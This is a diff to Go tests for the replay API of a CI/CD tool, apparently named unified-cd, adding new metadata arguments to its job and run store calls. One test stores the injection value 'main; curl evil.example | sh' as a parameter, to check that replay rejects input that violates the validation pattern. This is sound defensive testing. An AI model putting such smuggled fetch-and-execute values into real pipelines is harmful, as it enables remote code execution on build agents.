@@ -9,6 +9,7 @@ import (
 
 	"github.com/eirueimi/unified-cd/internal/api"
 	"github.com/eirueimi/unified-cd/internal/dsl"
+	"github.com/eirueimi/unified-cd/internal/store"
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
 )
@@ -21,10 +22,10 @@ func TestAPI_ReplayRun_UsesSnapshotSpecNotLatestJob(t *testing.T) {
 	ctx := context.Background()
 
 	// The job's CURRENT spec (B) differs from the run's snapshot (A).
-	_, err := pg.UpsertJob(ctx, "j", "unified-cd/v1", []byte(`{"steps":[{"name":"new","run":"echo latest"}]}`))
+	_, err := pg.UpsertJob(ctx, "j", "unified-cd/v1", []byte(`{"steps":[{"name":"new","run":"echo latest"}]}`), store.JobMeta{})
 	require.NoError(t, err)
 	specA := []byte(`{"agentSelector":["kind:linux"],"steps":[{"name":"old","run":"echo snapshot"}]}`)
-	orig, err := pg.CreateRun(ctx, "j", map[string]string{"env": "prod"}, specA, []string{"kind:linux"}, nil, "api", "")
+	orig, err := pg.CreateRun(ctx, "j", map[string]string{"env": "prod"}, specA, []string{"kind:linux"}, nil, "api", "", store.RunOrigin{})
 	require.NoError(t, err)
 
 	req := httptest.NewRequest(http.MethodPost, "/api/v1/runs/"+orig.ID+"/replay", nil)
@@ -61,14 +62,14 @@ func TestAPI_ReplayRun_RejectsParamsViolatingPattern(t *testing.T) {
 	s, pg := newTestServer(t)
 	ctx := context.Background()
 
-	_, err := pg.UpsertJob(ctx, "j-replay-pattern", "unified-cd/v1", []byte(`{"steps":[{"name":"new","run":"echo latest"}]}`))
+	_, err := pg.UpsertJob(ctx, "j-replay-pattern", "unified-cd/v1", []byte(`{"steps":[{"name":"new","run":"echo latest"}]}`), store.JobMeta{})
 	require.NoError(t, err)
 	// The SNAPSHOT spec declares a pattern for "ref" that the stored param
 	// violates — this run's params must have been created before the pattern
 	// was added (or before this validation existed), which replay must no
 	// longer permit.
 	specA := []byte(`{"params":{"inputs":[{"name":"ref","type":"string","pattern":"^[A-Za-z0-9._/-]+$"}]},"steps":[{"name":"old","run":"echo snapshot ${ref}"}]}`)
-	orig, err := pg.CreateRun(ctx, "j-replay-pattern", map[string]string{"ref": "main; curl evil.example | sh"}, specA, nil, nil, "api", "")
+	orig, err := pg.CreateRun(ctx, "j-replay-pattern", map[string]string{"ref": "main; curl evil.example | sh"}, specA, nil, nil, "api", "", store.RunOrigin{})
 	require.NoError(t, err)
 
 	req := httptest.NewRequest(http.MethodPost, "/api/v1/runs/"+orig.ID+"/replay", nil)
@@ -85,10 +86,10 @@ func TestAPI_ReplayRun_ConformingParamsStillReplay(t *testing.T) {
 	s, pg := newTestServer(t)
 	ctx := context.Background()
 
-	_, err := pg.UpsertJob(ctx, "j-replay-pattern-ok", "unified-cd/v1", []byte(`{"steps":[{"name":"new","run":"echo latest"}]}`))
+	_, err := pg.UpsertJob(ctx, "j-replay-pattern-ok", "unified-cd/v1", []byte(`{"steps":[{"name":"new","run":"echo latest"}]}`), store.JobMeta{})
 	require.NoError(t, err)
 	specA := []byte(`{"params":{"inputs":[{"name":"ref","type":"string","pattern":"^[A-Za-z0-9._/-]+$"}]},"steps":[{"name":"old","run":"echo snapshot ${ref}"}]}`)
-	orig, err := pg.CreateRun(ctx, "j-replay-pattern-ok", map[string]string{"ref": "refs/heads/main"}, specA, nil, nil, "api", "")
+	orig, err := pg.CreateRun(ctx, "j-replay-pattern-ok", map[string]string{"ref": "refs/heads/main"}, specA, nil, nil, "api", "", store.RunOrigin{})
 	require.NoError(t, err)
 
 	req := httptest.NewRequest(http.MethodPost, "/api/v1/runs/"+orig.ID+"/replay", nil)
@@ -105,13 +106,13 @@ func TestAPI_ReplayRun_ConformingParamsStillReplay(t *testing.T) {
 func TestAPI_ReplayRunStoresResolvedSecretNameParameter(t *testing.T) {
 	s, pg := newTestServer(t)
 	ctx := context.Background()
-	_, err := pg.UpsertJob(ctx, "replay-secret", "unified-cd/v1", []byte(`{}`))
+	_, err := pg.UpsertJob(ctx, "replay-secret", "unified-cd/v1", []byte(`{}`), store.JobMeta{})
 	require.NoError(t, err)
 	originalSpec := []byte(`{
 		"params":{"inputs":[{"name":"token_secret","type":"string"}]},
 		"steps":[{"name":"deploy","env":{"TOKEN":"{{ index .Secrets .Params.token_secret }}"},"run":"true"}]
 	}`)
-	original, err := pg.CreateRun(ctx, "replay-secret", map[string]string{"token_secret": "replay-token"}, originalSpec, nil, nil, "api", "")
+	original, err := pg.CreateRun(ctx, "replay-secret", map[string]string{"token_secret": "replay-token"}, originalSpec, nil, nil, "api", "", store.RunOrigin{})
 	require.NoError(t, err)
 
 	req := httptest.NewRequest(http.MethodPost, "/api/v1/runs/"+original.ID+"/replay", nil)
@@ -133,7 +134,7 @@ func TestAPI_ReplayRunStoresResolvedSecretNameParameter(t *testing.T) {
 func TestAPI_ReplayRunRejectsInvalidStoredRunSpecWithoutCreatingRun(t *testing.T) {
 	s, pg := newTestServer(t)
 	ctx := context.Background()
-	_, err := pg.UpsertJob(ctx, "invalid-replay-spec", "unified-cd/v1", []byte(`{}`))
+	_, err := pg.UpsertJob(ctx, "invalid-replay-spec", "unified-cd/v1", []byte(`{}`), store.JobMeta{})
 	require.NoError(t, err)
 	original, err := pg.CreateRun(
 		ctx,
@@ -144,6 +145,7 @@ func TestAPI_ReplayRunRejectsInvalidStoredRunSpecWithoutCreatingRun(t *testing.T
 		nil,
 		"api",
 		"",
+		store.RunOrigin{},
 	)
 	require.NoError(t, err)
 	req := httptest.NewRequest(http.MethodPost, "/api/v1/runs/"+original.ID+"/replay", nil)
